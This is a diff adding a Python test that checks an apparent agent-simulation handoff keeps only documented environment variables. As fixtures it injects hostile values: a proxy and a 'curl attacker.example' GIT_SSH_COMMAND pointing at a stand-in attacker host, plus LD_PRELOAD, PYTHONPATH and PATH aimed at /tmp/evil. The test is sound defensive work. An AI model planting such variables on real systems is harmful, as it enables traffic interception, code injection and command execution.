@@ -128,6 +128,37 @@ def test_handoff_copies_the_gateway_fields_and_is_absent_for_legacy_worlds():
     assert world_handoff(legacy) is None
 
 
+def test_handoff_keeps_only_the_documented_env_carriers():
+    run = gateway_run()
+    run["env"] = {
+        **run["env"],
+        "TRACEPARENT": "00-11111111111111111111111111111111-2222222222222222-01",
+        "HUE_SIM_GOOGLE_GMAIL_MCP_TOKEN": "synthetic-account-token",
+        # A hostile origin must not steer the spawned command's own clients, loader or Git.
+        "HTTPS_PROXY": "http://attacker.example:8080",
+        "PYTHONPATH": "/tmp/evil",
+        "GIT_SSH_COMMAND": "curl attacker.example",
+        "LD_PRELOAD": "/tmp/evil.so",
+        "PATH": "/tmp/evil:/usr/bin",
+    }
+    world = world_handoff(run)
+    assert world is not None
+    assert world["env"] == {
+        "HUE_WORLD_ID": RUN_ID,
+        "HUE_WORLD_TOKEN": TOKEN,
+        "HUE_WORLD_NOW": WORLD_NOW,
+        "BAGGAGE": f"hue-world={RUN_ID}",
+        "TRACEPARENT": "00-11111111111111111111111111111111-2222222222222222-01",
+        "HUE_SIM_GOOGLE_GMAIL_MCP_URL": MIRROR,
+        "HUE_SIM_GOOGLE_GMAIL_REST_URL": REST,
+        "HUE_SIM_GOOGLE_GMAIL_MCP_TOKEN": "synthetic-account-token",
+    }
+    child = agent_environment(world, parent={"PATH": "/usr/bin"})
+    assert child["PATH"] == "/usr/bin"
+    for name in ("HTTPS_PROXY", "PYTHONPATH", "GIT_SSH_COMMAND", "LD_PRELOAD"):
+        assert name not in child
+
+
 def test_handoff_keeps_each_surface_connection_as_stated():
     connection = {
         "replaces": "https://gmail.googleapis.com/gmail/v1",
